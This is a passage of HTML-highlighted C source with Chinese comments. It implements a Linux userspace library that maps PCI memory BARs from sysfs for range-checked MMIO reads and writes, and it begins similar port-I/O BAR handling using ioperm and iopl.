class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_MEM 0x00000200ULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">uint8_t</span>* bar; <span class="comment">// 映射后的虚拟基址</span></span><br><span class="line">    <span class="type">size_t</span> size; <span class="comment">// 资源真实大小（end - start + 1）</span></span><br><span class="line">    <span class="type">size_t</span> map_len; <span class="comment">// 实际 mmap 的长度（按页对齐）</span></span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// 打开的 /sys/.../resourceN</span></span><br><span class="line">    <span class="type">int</span> res_idx; <span class="comment">// 选中的 resource 行号（BAR 号 0..5）</span></span><br><span class="line">    <span class="comment">// 新增：物理信息</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_start; <span class="comment">// 该映射对应的设备物理起始地址（BAR 起点）</span></span><br><span class="line">    <span class="type">uint64_t</span> phys_end; <span class="comment">// 物理结束地址（含端点）</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res_flags; <span class="comment">// resource 行里的 flags（可用于判断 WC 等）</span></span><br><span class="line">    <span class="type">bool</span> inited;</span><br><span class="line">&#125; <span class="type">mmio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">mmio_ctx_t</span> g_mmio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：把 BDF 或 /sys/.../resource 解析成两个路径 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">build_paths</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span>* resource_txt, <span class="type">size_t</span> txt_sz,</span></span><br><span class="line"><span class="params">                       <span class="type">char</span>* dev_dir, <span class="type">size_t</span> dir_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!bdf_or_path || !*bdf_or_path)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 直接传了 /sys/.../resource 或 /sys/.../resourceN */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir, dir_sz, <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="type">char</span>* slash = <span class="built_in">strrchr</span>(dev_dir, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!slash)</span><br><span class="line">        &#123;</span><br><span class="line">            errno = EINVAL;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *slash = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="comment">// 如果传进来的是 resourceN，把它回退到目录再去拼 resource</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(resource_txt, <span class="string">&quot;/resource&quot;</span>) &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt) - <span class="number">1</span>] &gt;= <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &amp;&amp; resource_txt[<span class="built_in">strlen</span>(resource_txt) - <span class="number">1</span>] &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;%s/resource&quot;</span>, dev_dir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* 传的是 BDF */</span></span><br><span class="line">        <span class="built_in">snprintf</span>(resource_txt, txt_sz, <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">        <span class="built_in">snprintf</span>(dev_dir, dir_sz, <span class="string">&quot;/sys/bus/pci/devices/%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：解析 resource 文本，找内存型 BAR（或指定 BAR） --- */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_mem_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* resource_txt, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* start,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* end,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* flags,</span></span><br><span class="line"><span class="params">                         <span class="type">int</span>* picked_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* fp = fopen(resource_txt, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, sel = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> s = <span class="number">0</span>, e = <span class="number">0</span>, f = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;s, &amp;e, &amp;f) != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(f &amp; IORESOURCE_MEM) || e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = EINVAL;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (f &amp; IORESOURCE_MEM))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (e &lt; s)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sel = idx;</span><br><span class="line">                <span class="keyword">if</span> (start) *start = s;</span><br><span class="line">                <span class="keyword">if</span> (end) *end = e;</span><br><span class="line">                <span class="keyword">if</span> (flags) *flags = f;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (sel &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ENOENT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (picked_idx) *picked_idx = sel;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 对外：初始化 / 映射 --- */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_init</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EALREADY;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> resource_txt[PATH_MAX];</span><br><span class="line">    <span class="type">char</span> dev_dir[PATH_MAX];</span><br><span class="line">    <span class="keyword">if</span> (build_paths(bdf_or_path, resource_txt, <span class="keyword">sizeof</span>(resource_txt),</span><br><span class="line">                    dev_dir, <span class="keyword">sizeof</span>(dev_dir)) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> res_idx = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (parse_mem_bar(resource_txt, bar_idx, &amp;start, &amp;end, &amp;flags, &amp;res_idx) != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> size = (<span class="type">size_t</span>)((end - start) + <span class="number">1ULL</span>);</span><br><span class="line">    <span class="type">size_t</span> pg = (<span class="type">size_t</span>)sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">size_t</span> map_len = (size + pg - <span class="number">1</span>) &amp; ~(pg - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> res_path[PATH_MAX];</span><br><span class="line">    <span class="built_in">snprintf</span>(res_path, <span class="keyword">sizeof</span>(res_path), <span class="string">&quot;%s/resource%d&quot;</span>, dev_dir, res_idx);</span><br><span class="line">    <span class="type">int</span> fd = open(res_path, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 对 MMIO，MAP_SHARED 必须；是否加 MAP_POPULATE 对 MMIO 不关键</span></span><br><span class="line">    <span class="type">void</span>* <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>, map_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">map</span> == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> sv = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = sv;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    g_mmio.bar = (<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)<span class="built_in">map</span>;</span><br><span class="line">    g_mmio.size = size;</span><br><span class="line">    g_mmio.map_len = map_len;</span><br><span class="line">    g_mmio.fd = fd;</span><br><span class="line">    g_mmio.res_idx = res_idx;</span><br><span class="line">    g_mmio.phys_start = (<span class="type">uint64_t</span>)start;</span><br><span class="line">    g_mmio.phys_end = (<span class="type">uint64_t</span>)end;</span><br><span class="line">    g_mmio.res_flags = flags;</span><br><span class="line">    g_mmio.inited = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_fini</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.bar) munmap((<span class="type">void</span>*)g_mmio.bar, g_mmio.map_len);</span><br><span class="line">    <span class="keyword">if</span> (g_mmio.fd &gt;= <span class="number">0</span>) close(g_mmio.fd);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;g_mmio, <span class="number">0</span>, <span class="keyword">sizeof</span>(g_mmio));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（虚拟信息） --- */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* <span class="title function_">mmio_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.bar; &#125;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">mmio_size</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.size; &#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mmio_bar_index</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.res_idx; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 查询（物理信息） --- */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_base</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_start; &#125;</span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_phys_limit</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> g_mmio.phys_end; &#125; <span class="comment">// inclusive</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* off -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_offset_to_phys</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off &gt;= g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* VA(映射内某指针) -&gt; 设备物理地址（范围检查） */</span></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_virt_to_phys</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited || !p)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uintptr_t</span> base = (<span class="type">uintptr_t</span>)g_mmio.bar;</span><br><span class="line">    <span class="type">uintptr_t</span> addr = (<span class="type">uintptr_t</span>)p;</span><br><span class="line">    <span class="keyword">if</span> (addr &lt; base || addr &gt;= base + g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EINVAL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> off = (<span class="type">size_t</span>)(addr - base);</span><br><span class="line">    <span class="keyword">return</span> g_mmio.phys_start + (<span class="type">uint64_t</span>)off;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 内部：范围检查 --- */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">chk</span><span class="params">(<span class="type">size_t</span> off, <span class="type">size_t</span> width)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!g_mmio.inited)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = EPERM;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (off + width &gt; g_mmio.size)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ERANGE;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- 读写 API（按天然宽度访问；PCI 寄存器通常小端） --- */</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">mmio_read8</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> <span class="title function_">mmio_read16</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read32</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read64</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write8</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint8_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint8_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write16</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint16_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">2</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint16_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write32</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint32_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">4</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint32_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">size_t</span> off, <span class="type">uint64_t</span> v)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">8</span>)) <span class="keyword">return</span>;</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">uint64_t</span>*)(g_mmio.bar + off) = v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 返回映射内某 offset 的可直接访问指针 */</span></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">void</span>* <span class="title function_">mmio_ptr</span><span class="params">(<span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (chk(off, <span class="number">1</span>)) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">volatile</span> <span class="type">void</span>*)(g_mmio.bar + off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORESOURCE_IO 0x00000100ULL  <span class="comment">// 与内核 ioport 标志一致</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint16_t</span> base; <span class="comment">// 端口基址 (x86 的 I/O 空间是 16-bit)</span></span><br><span class="line">    <span class="type">uint32_t</span> size; <span class="comment">// BAR 大小（字节）</span></span><br><span class="line">    <span class="type">uint16_t</span> grant_base; <span class="comment">// 实际通过 ioperm 开放的起始端口</span></span><br><span class="line">    <span class="type">uint32_t</span> grant_len; <span class="comment">// 实际开放长度</span></span><br><span class="line">    <span class="type">bool</span> have_ioperm;</span><br><span class="line">    <span class="type">bool</span> have_iopl;</span><br><span class="line">    <span class="type">bool</span> inited;</span><br><span class="line">&#125; <span class="type">pio_ctx_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">pio_ctx_t</span> g_pio = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：从 /sys/bus/pci/devices/&lt;BDF&gt;/resource 解析出指定 BAR（或自动挑首个 PIO BAR）的 start/end/flags */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">parse_io_bar</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* bdf_or_path, <span class="type">int</span> bar_idx,</span></span><br><span class="line"><span class="params">                        <span class="type">uint16_t</span>* out_base, <span class="type">uint32_t</span>* out_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strchr</span>(bdf_or_path, <span class="string">&#x27;/&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 可直接传 resource 文件全路径</span></span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;%s&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(path, <span class="keyword">sizeof</span>(path), <span class="string">&quot;/sys/bus/pci/devices/%s/resource&quot;</span>, bdf_or_path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FILE* fp = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, chosen = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), fp))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> start = <span class="number">0</span>, end = <span class="number">0</span>, flags = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%llx %llx %llx&quot;</span>, &amp;start, &amp;end, &amp;flags) != <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            idx++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bar_idx &gt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx == bar_idx)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(flags &amp; IORESOURCE_IO))</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = EINVAL;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (idx &lt;= <span class="number">5</span> &amp;&amp; (flags &amp; IORESOURCE_IO))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (end &lt; start || start &gt; <span class="number">0xFFFF</span>ULL)</span><br><span class="line">                &#123;</span><br><span class="line">                    fclose(fp);</span><br><span class="line">                    errno = ERANGE;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                *out_base = (<span class="type">uint16_t</span>)start;</span><br><span class="line">                *out_size = (<span class="type">uint32_t</span>)(end - start + <span class="number">1</span>);</span><br><span class="line">                chosen = idx;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">if</span> (chosen &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errno = ENOENT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 内部：获取端口访问权限。优先 ioperm(仅开本 BAR 范围)，失败回退 iopl(3) */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">acquire_io_priv</span><span class="params">(<span class="type">uint16_t</span> base, <span class="type">uint32_t</span> size,</span></span><br><span class="line"><span class="params">                           <span class="type">uint16_t</span>* grant_base, <span class="type">uint32_t</span>* grant_len,</span></span><br><span class="line"><span class="params">                           <span class="type">bool</span>* have_ioperm, <span class="type">bool</span>* have_iopl)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = size;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span>)base + len &gt; <span class="number">0x10000</span>u) len = <span class="number">0x10000</span>u - base; <span class="comment">// 不越过 64K 上限</span></span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) len = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span 